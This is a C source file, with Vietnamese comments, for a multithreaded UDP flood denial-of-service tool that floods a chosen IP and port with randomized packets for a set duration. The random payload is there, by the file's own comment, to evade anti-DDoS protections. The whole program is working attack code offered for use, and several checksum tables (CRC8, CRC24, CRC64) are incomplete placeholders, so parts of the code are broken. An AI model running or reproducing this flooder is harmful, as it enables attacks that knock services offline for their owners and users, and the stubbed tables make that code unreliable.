#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <time.h>
#include <stdint.h>
#include <stdbool.h>

#define DEFAULT_PACKET_SIZE 1024

// Cấu trúc tham số cho flood attack
typedef struct {
    char *ip;
    int port;
    int duration;
    int pps;
    int packet_size;
    char *custom_data;
    bool use_checksum; // Bật/tắt checksum
    int checksum_type; // Loại checksum (0: CRC32, 1: CRC16, 2: CRC8, 3: CRC24, 4: CRC64, 5: None)
} flood_args;

// Bảng CRC32
static const uint32_t crc32_table[256] = {
    0x00000000, 0x77073096, 0xee0e612c, 0x990951ba, 0x076dc419, 0x706af48f,
    0xe963a535, 0x9e6495a3, 0x0edb8832, 0x79dcb8a4, 0xe0d5e91e, 0x97d2d988,
    0x09b64c2b, 0x7eb17cbd, 0xe7b82d07, 0x90bf1d91, 0x1db71064, 0x6ab020f2,
    0xf3b97148, 0x84be41de, 0x1adad47d, 0x6ddde4eb, 0xf4d4b551, 0x83d385c7,
    0x136c9856, 0x646ba8c0, 0xfd62f97a, 0x8a65c9ec, 0x14015c4f, 0x63066cd9,
    0xfa0f3d63, 0x8d080df5, 0x3b6e20c8, 0x4c69105e, 0xd56041e4, 0xa2677172,
    0x3c03e4d1, 0x4b04d447, 0xd20d85fd, 0xa50ab56b, 0x35b5a8fa, 0x42b2986c,
    0xdbbbc9d6, 0xacbcf940, 0x32d86ce3, 0x45df5c75, 0xdcd60dcf, 0xabd13d59,
    0x26d930ac, 0x51de003a, 0xc8d75180, 0xbfd06116, 0x21b4f4b5, 0x56b3c423,
    0xcfba9599, 0xb8bda50f, 0x2802b89e, 0x5f058808, 0xc60cd9b2, 0xb10be924,
    0x2f6f7c87, 0x58684c11, 0xc1611dab, 0xb6662d3d, 0x76dc4190, 0x01db7106,
    0x98d220bc, 0xefd5102a, 0x71b18589, 0x06b6b51f, 0x9fbfe4a5, 0xe8b8d433,
    0x7807c9a2, 0x0f00f934, 0x9609a88e, 0xe10e9818, 0x7f6a0dbb, 0x086d3d2d,
    0x91646c97, 0xe6635c01, 0x6b6b51f4, 0x1c6c6162, 0x856530d8, 0xf262004e,
    0x6c0695ed, 0x1b01a57b, 0x8208f4c1, 0xf50fc457, 0x65b0d9c6, 0x12b7e950,
    0x8bbeb8ea, 0xfcb9887c, 0x62dd1ddf, 0x15da2d49, 0x8cd37cf3, 0xfbd44c65,
    0x4db26158, 0x3ab551ce, 0xa3bc0074, 0xd4bb30e2, 0x4adfa541, 0x3dd895d7,
    0xa4d1c46d, 0xd3d6f4fb, 0x4369e96a, 0x346ed9fc, 0xad678846, 0xda60b8d0,
    0x44042d73, 0x33031de5, 0xaa0a4c5f, 0xdd0d7cc9, 0x5005713c, 0x270241aa,
    0xbe0b1010, 0xc90c2086, 0x5768b525, 0x206f85b3, 0xb966d409, 0xce61e49f,
    0x5edef90e, 0x29d9c998, 0xb0d09822, 0xc7d7a8b4, 0x59b33d17, 0x2eb40d81,
    0xb7bd5c3b, 0xc0ba6cad, 0xedb88320, 0x9abfb3b6, 0x03b6e20c, 0x74b1d29a,
    0xead54739, 0x9dd277af, 0x04db2615, 0x73dc1683, 0xe3630b12, 0x94643b84,
    0x0d6d6a3e, 0x7a6a5aa8, 0xe40ecf0b, 0x9309ff9d, 0x0a00ae27, 0x7d079eb1,
    0xf00f9344, 0x8708a3d2, 0x1e01f268, 0x6906c2fe, 0xf762575d, 0x806567cb,
    0x196c3671, 0x6e6b06e7, 0xfed41b76, 0x89d32be0, 0x10da7a5a, 0x67dd4acc,
    0xf9b9df6f, 0x8ebeeff9, 0x17b7be43, 0x60b08ed5, 0xd6d6a3e8, 0xa1d1937e,
    0x38d8c2c4, 0x4fdff252, 0xd1bb67f1, 0xa6bc5767, 0x3fb506dd, 0x48b2364b,
    0xd80d2bda, 0xaf0a1b4c, 0x36034af6, 0x41047a60, 0xdf60efc3, 0xa867df55,
    0x316e8eef, 0x4669be79, 0xcb61b38c, 0xbc66831a, 0x256fd2a0, 0x5268e236,
    0xcc0c7795, 0xbb0b4703, 0x220216b9, 0x5505262f, 0xc5ba3bbe, 0xb2bd0b28,
    0x2bb45a92, 0x5cb36a04, 0xc2d7ffa7, 0xb5d0cf31, 0x2cd99e8b, 0x5bdeae1d,
    0x9b64c2b0, 0xec63f226, 0x756aa39c, 0x026d930a, 0x9c0906a9, 0xeb0e363f,
    0x72076785, 0x05005713, 0x95bf4a82, 0xe2b87a14, 0x7bb12bae, 0x0cb61b38,
    0x92d28e9b, 0xe5d5be0d, 0x7cdcefb7, 0x0bdbdf21, 0x86d3d2d4, 0xf1d4e242,
    0x68ddb3f8, 0x1fda836e, 0x81be16cd, 0xf6b9265b, 0x6fb077e1, 0x18b74777,
    0x88085ae6, 0xff0f6a70, 0x66063bca, 0x11010b5c, 0x8f659eff, 0xf862ae69,
    0x616bffd3, 0x166ccf45, 0xa00ae278, 0xd70dd2ee, 0x4e048354, 0x3903b3c2,
    0xa7672661, 0xd06016f7, 0x4969474d, 0x3e6e77db, 0xaed16a4a, 0xd9d65adc,
    0x40df0b66, 0x37d83bf0, 0xa9bcae53, 0xdebb9ec5, 0x47b2cf7f, 0x30b5ffe9,
    0xbdbdf21c, 0xcabac28a, 0x53b39330, 0x24b4a3a6, 0xbad03605, 0xcdd70693,
    0x54de5729, 0x23d967bf, 0xb3667a2e, 0xc4614ab8, 0x5d681b02, 0x2a6f2b94,
    0xb40bbe37, 0xc30c8ea1, 0x5a05df1b, 0x2d02ef8d
};

// Bảng CRC16
static const uint16_t crc16_table[256] = {
    0x0000, 0xC0C1, 0xC181, 0x0140, 0xC301, 0x03C0, 0x0280, 0xC241,
    0xC601, 0x06C0, 0x0780, 0xC741, 0x0500, 0xC5C1, 0xC481, 0x0440,
    0xCC01, 0x0CC0, 0x0D80, 0xCD41, 0x0F00, 0xCFC1, 0xCE81, 0x0E40,
    0x0A00, 0xCAC1, 0xCB81, 0x0B40, 0xC901, 0x09C0, 0x0880, 0xC841,
    0xD801, 0x18C0, 0x1980, 0xD941, 0x1B00, 0xDBC1, 0xDA81, 0x1A40,
    0x1E00, 0xDEC1, 0xDF81, 0x1F40, 0xDD01, 0x1DC0, 0x1C80, 0xDC41,
    0x1400, 0xD4C1, 0xD581, 0x1540, 0xD701, 0x17C0, 0x1680, 0xD641,
    0xD201, 0x12C0, 0x1380, 0xD341, 0x1100, 0xD1C1, 0xD081, 0x1040,
    0xF001, 0x30C0, 0x3180, 0xF141, 0x3300, 0xF3C1, 0xF281, 0x3240,
    0x3600, 0xF6C1, 0xF781, 0x3740, 0xF501, 0x35C0, 0x3480, 0xF441,
    0x3C00, 0xFCC1, 0xFD81, 0x3D40, 0xFF01, 0x3FC0, 0x3E80, 0xFE41,
    0xFA01, 0x3AC0, 0x3B80, 0xFB41, 0x3900, 0xF9C1, 0xF881, 0x3840,
    0x2800, 0xE8C1, 0xE981, 0x2940, 0xEB01, 0x2BC0, 0x2A80, 0xEA41,
    0xEE01, 0x2EC0, 0x2F80, 0xEF41, 0x2D00, 0xEDC1, 0xEC81, 0x2C40,
    0xE401, 0x24C0, 0x2580, 0xE541, 0x2700, 0xE7C1, 0xE681, 0x2640,
    0x2200, 0xE2C1, 0xE381, 0x2340, 0xE101, 0x21C0, 0x2080, 0xE041,
    0xA001, 0x60C0, 0x6180, 0xA141, 0x6300, 0xA3C1, 0xA281, 0x6240,
    0x6600, 0xA6C1, 0xA781, 0x6740, 0xA501, 0x65C0, 0x6480, 0xA441,
    0x6C00, 0xACC1, 0xAD81, 0x6D40, 0xAF01, 0x6FC0, 0x6E80, 0xAE41,
    0xAA01, 0x6AC0, 0x6B80, 0xAB41, 0x6900, 0xA9C1, 0xA881, 0x6840,
    0x7800, 0xB8C1, 0xB981, 0x7940, 0xBB01, 0x7BC0, 0x7A80, 0xBA41,
    0xBE01, 0x7EC0, 0x7F80, 0xBF41, 0x7D00, 0xBDC1, 0xBC81, 0x7C40,
    0xB401, 0x74C0, 0x7580, 0xB541, 0x7700, 0xB7C1, 0xB681, 0x7640,
    0x7200, 0xB2C1, 0xB381, 0x7340, 0xB101, 0x71C0, 0x7080, 0xB041,
    0x5000, 0x90C1, 0x9181, 0x5140, 0x9301, 0x53C0, 0x5280, 0x9241,
    0x9601, 0x56C0, 0x5780, 0x9741, 0x5500, 0x95C1, 0x9481, 0x5440,
    0x9C01, 0x5CC0, 0x5D80, 0x9D41, 0x5F00, 0x9FC1, 0x9E81, 0x5E40,
    0x5A00, 0x9AC1, 0x9B81, 0x5B40, 0x9901, 0x59C0, 0x5880, 0x9841,
    0x8801, 0x48C0, 0x4980, 0x8941, 0x4B00, 0x8BC1, 0x8A81, 0x4A40,
    0x4E00, 0x8EC1, 0x8F81, 0x4F40, 0x8D01, 0x4DC0, 0x4C80, 0x8C41,
    0x4400, 0x84C1, 0x8581, 0x4540, 0x8701, 0x47C0, 0x4680, 0x8641,
    0x8201, 0x42C0, 0x4380, 0x8341, 0x4100, 0x81C1, 0x8081, 0x4040
};

// Bảng CRC8
static const uint8_t crc8_table[256] = {
    0x00, 0x07, 0x0E, 0x09, 0x1C, 0x1B, 0x12, 0x15,
    0x38, 0x3F, 0x36, 0x31, 0x24, 0x23, 0x2A, 0x2D,
    0x70, 0x77, 0x7E, 0x79, 0x6C, 0x6B, 0x62, 0x65,
    0x4C, 0x4B, 0x42, 0x45, 0x50, 0x57, 0x5E, 0x59,
    0xE0, 0xE7, 0xEE, 0xE9, 0xFC, 0xFB, 0xF2, 0xF5,
    0xD8, 0xDF, 0xD6, 0xD1, 0xC4, 0xC3, 0xCA, 0xCD,
    0xA0, 0xA7, 0xAE, 0xA9, 0xBC, 0xBB, 0xB2, 0xB5,
    0x90, 0x97, 0x9E, 0x99, 0x8C, 0x8B, 0x82, 0x85,
    0x3A, 0x3D, 0x34, 0x33, 0x26, 0x21, 0x28, 0x2F,
    0x0C, 0x0B, 0x02, 0x05, 0x1E, 0x19, 0x10, 0x17,
    0x7A, 0x7D, 0x74, 0x73, 0x66, 0x61, 0x68, 0x6F,
    0x4A, 0x4D, 0x44, 0x43, 0x56, 0x51, 0x58, 0x5F,
    0xF0, 0xF7, 0xFE, 0xF9, 0xEC, 0xEB, 0xE2, 0xE5,
    0xC8, 0xCF, 0xC6, 0xC1, 0xD4, 0xD3, 0xDA, 0xDD,
    0xA0, 0xA7, 0xAE, 0xA9, 0xBC, 0xBB, 0xB2, 0xB5,
    0x90, 0x97, 0x9E, 0x99, 0x8C, 0x8B, 0x82, 0x85,
    0x27, 0x20, 0x29, 0x2E, 0x3B, 0x3C, 0x35, 0x32,
    0x0F, 0x08, 0x01, 0x06, 0x13, 0x14, 0x1D, 0x1A,
    0x75, 0x72, 0x7B, 0x7C, 0x69, 0x6E, 0x67, 0x60,
    0x4D, 0x4A, 0x43, 0x44, 0x51, 0x56, 0x5F, 0x58
};

// Bảng CRC24
static const uint32_t crc24_table[256] = {
    // Định nghĩa bảng CRC24 ở đây
    // Ví dụ các giá trị mẫu, bạn có thể cần tính toán hoặc tìm bảng CRC24 đúng
    0x000000, 0x00C1B8, 0x01836F, 0x0142D7, 0x0306DE, 0x03C748, 0x0285C8, 0x02444A,
    // ...

    // Cần thêm đầy đủ 256 giá trị cho CRC24
};

// Bảng CRC64
static const uint64_t crc64_table[256] = {
    // Định nghĩa bảng CRC64 ở đây
    // Ví dụ các giá trị mẫu, bạn có thể cần tính toán hoặc tìm bảng CRC64 đúng
    0x0000000000000000, 0x42F0B1ED553B2E48, 0x85E081DBA1075C90, 0xC7D1D5B63C3C72D,
    // ...

    // Cần thêm đầy đủ 256 giá trị cho CRC64
};

// Hàm tính CRC8
uint8_t calculate_crc8(const void *data, size_t length) {
    const uint8_t *bytes = (const uint8_t *)data;
    uint8_t crc = 0;

    for (size_t i = 0; i < length; i++) {
        crc = crc8_table[crc ^ bytes[i]];
    }

    return crc;
}

// Hàm tính CRC24
uint32_t calculate_crc24(const void *data, size_t length) {
    const uint8_t *bytes = (const uint8_t *)data;
    uint32_t crc = 0x00FFFFFF; // Bắt đầu từ 0xFFFFFF

    for (size_t i = 0; i < length; i++) {
        uint8_t table_index = (crc ^ bytes[i]) & 0xFF;
        crc = (crc >> 8) ^ crc24_table[table_index];
    }

    return crc;
}

// Hàm tính CRC64
uint64_t calculate_crc64(const void *data, size_t length) {
    const uint8_t *bytes = (const uint8_t *)data;
    uint64_t crc = 0xFFFFFFFFFFFFFFFF; // Bắt đầu từ 0xFFFFFFFFFFFFFFFF

    for (size_t i = 0; i < length; i++) {
        uint8_t table_index = (crc ^ bytes[i]) & 0xFF;
        crc = (crc >> 8) ^ crc64_table[table_index];
    }

    return crc;
}

// Hàm tính CRC32
uint32_t calculate_crc32(const void *data, size_t length) {
    const uint8_t *bytes = (const uint8_t *)data;
    uint32_t crc = 0xffffffff;

    for (size_t i = 0; i < length; i++) {
        uint8_t table_index = (crc ^ bytes[i]) & 0xff;
        crc = (crc >> 8) ^ crc32_table[table_index];
    }

    return crc ^ 0xffffffff;
}

// Hàm tính CRC16
uint16_t calculate_crc16(const void *data, size_t length) {
    const uint8_t *bytes = (const uint8_t *)data;
    uint16_t crc = 0xffff;

    for (size_t i = 0; i < length; i++) {
        uint8_t table_index = (crc ^ bytes[i]) & 0xff;
        crc = (crc >> 8) ^ crc16_table[table_index];
    }

    return crc;
}

// Hàm tính toán checksum dựa trên loại được chọn
uint64_t calculate_checksum(const void *data, size_t length, int checksum_type) {
    switch (checksum_type) {
        case 0: // CRC32
            return calculate_crc32(data, length);
        case 1: // CRC16
            return calculate_crc16(data, length);
        case 2: // CRC8
            return calculate_crc8(data, length);
        case 3: // CRC24
            return calculate_crc24(data, length);
        case 4: // CRC64
            return calculate_crc64(data, length);
        default: // Không sử dụng checksum
            return 0;
    }
}

// Hàm Xorshift để tạo số ngẫu nhiên
static uint32_t xorshift_state = 0;

void xorshift_seed(uint32_t seed) {
    xorshift_state = seed;
}

uint32_t xorshift32() {
    uint32_t x = xorshift_state;
    x ^= x << 13;
    x ^= x >> 17;
    x ^= x << 5;
    xorshift_state = x;
    return x;
}

// Hàm rand cao cấp sử dụng Xorshift
int advanced_rand() {
    if (xorshift_state == 0) {
        xorshift_seed((uint32_t)time(NULL));
    }
    return (int)xorshift32();
}

// Hàm tạo chuỗi ngẫu nhiên
char *generate_random_data(int length) {
    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    char *random_data = malloc(length + 1);
    if (!random_data) {
        perror("Failed to allocate memory for random data");
        return NULL;
    }

    for (int i = 0; i < length; i++) {
        random_data[i] = charset[advanced_rand() % (sizeof(charset) - 1)];
    }
    random_data[length] = '\0';
    return random_data;
}

// Hàm flood UDP
void *udp_flood(void *args) {
    flood_args *params = (flood_args *)args;
    int sock;
    struct sockaddr_in server_addr;

    // Chuẩn bị gói tin
    char *buffer = malloc(params->packet_size);
    if (!buffer) {
        perror("Failed to allocate memory for buffer");
        pthread_exit(NULL);
    }

    if (params->custom_data) {
        strncpy(buffer, params->custom_data, params->packet_size);
    } else {
        memset(buffer, 0, params->packet_size);
    }

    // Tính toán checksum và thêm vào gói tin (nếu được bật)
    if (params->use_checksum) {
        uint64_t checksum = calculate_checksum(buffer, params->packet_size, params->checksum_type);
        memcpy(buffer + params->packet_size - sizeof(checksum), &checksum, sizeof(checksum));
    }

    // Tạo socket
    if ((sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0) {
        perror("Socket creation failed");
        free(buffer);
        pthread_exit(NULL);
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(params->port);
    server_addr.sin_addr.s_addr = inet_addr(params->ip);

    int packets_sent = 0;
    time_t start_time = time(NULL);

    while (time(NULL) - start_time < params->duration) {
        if (sendto(sock, buffer, params->packet_size, 0, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
            perror("Failed to send packet");
            break;
        }
        packets_sent++;

        // Kiểm soát tốc độ gửi dựa trên pps (packets per second)
        if (params->pps > 0) {
            usleep(1000000 / params->pps); // Chia 1 giây thành các khoảng thời gian để gửi gói tin
        }
    }

    printf("Thread finished. Packets sent: %d\n", packets_sent);

    close(sock);
    free(buffer);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc < 5) {
        printf("Usage: %s <ip> <port> <threads> <time>\n", argv[0]);
        printf("Options:\n");
        printf("  <ip>               - Target IP address.\n");
        printf("  <port>             - Target port.\n");
        printf("  <threads>          - Number of threads to use.\n");
        printf("  <time>             - Duration of the attack in seconds.\n");
        return EXIT_FAILURE;
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int threads = atoi(argv[3]);
    int duration = atoi(argv[4]);
    int pps = 0; // Mặc định pps là 0 (unlimited)

    // Tạo dữ liệu ngẫu nhiên để bypass anti-DDoS
    xorshift_seed((uint32_t)time(NULL)); // Khởi tạo seed ngẫu nhiên
    char *custom_data = generate_random_data(DEFAULT_PACKET_SIZE);
    if (!custom_data) {
        fprintf(stderr, "Failed to generate random data.\n");
        return EXIT_FAILURE;
    }

    // Cấu hình checksum
    bool use_checksum = true; // Bật checksum
    int checksum_type = 0;    // Sử dụng CRC32

    pthread_t thread_pool[threads];
    flood_args args = {ip, port, duration, pps, DEFAULT_PACKET_SIZE, custom_data, use_checksum, checksum_type};

    printf("Starting UDP flood attack...\n");
    for (int i = 0; i < threads; i++) {
        if (pthread_create(&thread_pool[i], NULL, udp_flood, &args) != 0) {
            perror("Failed to create thread");
            free(custom_data);
            return EXIT_FAILURE;
        }
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(thread_pool[i], NULL);
    }

    free(custom_data);

    printf("UDP flood attack completed.\n");
    return EXIT_SUCCESS;
}